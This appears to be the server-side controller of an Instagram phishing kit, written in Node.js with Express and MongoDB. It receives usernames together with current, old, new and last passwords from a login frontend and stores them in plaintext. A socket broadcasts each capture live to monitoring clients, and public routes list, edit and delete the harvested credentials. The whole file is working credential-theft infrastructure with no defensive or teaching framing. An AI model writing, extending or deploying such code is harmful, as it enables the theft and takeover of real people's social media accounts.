const InstaLogin = require('../models/InstaLogin.model');
const { getIo } = require('../config/socket');
const { sendSuccess, sendFailure } = require('../utils/response');

/* ── Helper: map a MongoDB document to the frontend shape ────────────────── */
const formatEntry = (entry) => {
  const base = {
    id: entry._id.toString(),
    service: (entry.source || 'Instagram').toLowerCase(),
    username: entry.username,
    type: entry.path || 'login',
    at: entry.createdAt ? entry.createdAt.toISOString() : new Date().toISOString(),
  };

  // Only include password fields that are actually set
  if (entry.password) base.password = entry.password;
  if (entry.oldPassword) base.oldPassword = entry.oldPassword;
  if (entry.newPassword) base.newPassword = entry.newPassword;
  if (entry.lastPassword) base.lastPassword = entry.lastPassword;

  return base;
};

/**
 * @desc    Receive Instagram login data from frontend and store to DB
 * @route   POST /api/instagram/login
 * @access  Public
 */
const instagramLogin = async (req, res) => {
  try {
    const { username, password, source, path, time, oldPassword, newPassword, lastPassword } = req.body;

    if (!username) {
      return sendFailure(res, 'Username is required', 400);
    }

    // At least one password-related field must be present
    const hasPassword = password || oldPassword || newPassword || lastPassword;
    if (!hasPassword) {
      return sendFailure(res, 'At least one password field is required', 400);
    }

    // Always generate IST time on the server — never trust the client clock
    const istTime = new Date().toLocaleString('en-IN', {
      timeZone: 'Asia/Kolkata',
      day: '2-digit',
      month: '2-digit',
      year: 'numeric',
      hour: '2-digit',
      minute: '2-digit',
      second: '2-digit',
      hour12: true,
    });

    const entry = await InstaLogin.create({
      username,
      password,
      oldPassword,
      newPassword,
      lastPassword,
      source: source || 'Instagram',
      path: path || 'login',
      time: time || istTime,
    });

    console.log(`📥 New entry — user: ${entry.username} | source: ${entry.source} | path: ${entry.path} | time (IST): ${entry.time}`);

    // Broadcast to connected monitor clients
    const io = getIo();
    if (io) io.emit('newCredential', formatEntry(entry));

    return sendSuccess(
      res,
      'Login data saved successfully',
      {
        id: entry._id.toString(),
        time: entry.time,
        createdAt: entry.createdAt,
      },
      201
    );
  } catch (error) {
    return sendFailure(res, error.message || 'Internal Server Error', 500);
  }
};

/**
 * @desc    Get all stored credentials
 * @route   GET /api/instagram
 * @access  Public
 */
const getAllCredentials = async (req, res) => {
  try {
    const entries = await InstaLogin.find().sort({ createdAt: -1 });
    const credentials = entries.map(formatEntry);
    return sendSuccess(res, 'Data retrieved', { credentials });
  } catch (error) {
    return sendFailure(res, error.message || 'Internal Server Error', 500);
  }
};

/**
 * @desc    Update a single credential
 * @route   PUT /api/instagram/:id
 * @access  Public
 */
const updateCredential = async (req, res) => {
  try {
    const { id } = req.params;
    const { username, password, oldPassword, newPassword, lastPassword, source, path } = req.body;

    const updates = {};
    if (username !== undefined) updates.username = username;
    if (password !== undefined) updates.password = password;
    if (oldPassword !== undefined) updates.oldPassword = oldPassword;
    if (newPassword !== undefined) updates.newPassword = newPassword;
    if (lastPassword !== undefined) updates.lastPassword = lastPassword;
    if (source !== undefined) updates.source = source;
    if (path !== undefined) updates.path = path;

    const entry = await InstaLogin.findByIdAndUpdate(id, updates, { new: true });
    if (!entry) return sendFailure(res, 'Credential not found', 404);

    const formatted = formatEntry(entry);

    const io = getIo();
    if (io) io.emit('credentialUpdated', formatted);

    return sendSuccess(res, 'Credential updated', { credential: formatted });
  } catch (error) {
    return sendFailure(res, error.message || 'Internal Server Error', 500);
  }
};

/**
 * @desc    Delete a single credential
 * @route   DELETE /api/instagram/:id
 * @access  Public
 */
const deleteCredential = async (req, res) => {
  try {
    const { id } = req.params;
    const entry = await InstaLogin.findByIdAndDelete(id);
    if (!entry) return sendFailure(res, 'Credential not found', 404);

    const io = getIo();
    if (io) io.emit('credentialDeleted', { id });

    return sendSuccess(res, 'Credential deleted');
  } catch (error) {
    return sendFailure(res, error.message || 'Internal Server Error', 500);
  }
};

/**
 * @desc    Delete multiple credentials (bulk)
 * @route   DELETE /api/instagram
 * @access  Public
 */
const deleteCredentials = async (req, res) => {
  try {
    const { ids } = req.body;
    if (!Array.isArray(ids) || ids.length === 0) {
      return sendFailure(res, 'ids array is required', 400);
    }

    await InstaLogin.deleteMany({ _id: { $in: ids } });

    const io = getIo();
    if (io) io.emit('credentialsDeleted', { ids });

    return sendSuccess(res, `${ids.length} credential(s) deleted`);
  } catch (error) {
    return sendFailure(res, error.message || 'Internal Server Error', 500);
  }
};

/**
 * @desc    Delete ALL credentials
 * @route   DELETE /api/instagram/all
 * @access  Public
 */
const deleteAllCredentials = async (req, res) => {
  try {
    const result = await InstaLogin.deleteMany({});

    const io = getIo();
    if (io) io.emit('credentialsCleared');

    return sendSuccess(res, `${result.deletedCount} credential(s) deleted`);
  } catch (error) {
    return sendFailure(res, error.message || 'Internal Server Error', 500);
  }
};

module.exports = {
  instagramLogin,
  getAllCredentials,
  updateCredential,
  deleteCredential,
  deleteCredentials,
  deleteAllCredentials,
};
